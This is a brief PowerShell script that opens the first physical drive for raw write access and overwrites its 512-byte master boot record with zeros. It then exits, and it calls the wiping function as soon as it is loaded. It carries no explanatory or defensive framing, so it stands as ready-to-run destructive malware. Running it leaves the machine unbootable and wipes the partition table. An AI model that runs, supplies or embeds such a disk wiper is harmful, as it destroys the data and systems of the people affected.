$MBR_SIZE = 512

function Write-MBR {
    $mbrData = New-Object byte[] $MBR_SIZE

    $MasterBootRecord = [System.IO.FileStream]::new("\\.\PhysicalDrive0", [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite)

    try {
        $MasterBootRecord.Write($mbrData, 0, $MBR_SIZE)
        Start-Sleep -Milliseconds 5000
        exit
    }
    catch {
        # Handle the exception if needed
    }
    finally {
        $MasterBootRecord.Close()
    }
}

Write-MBR
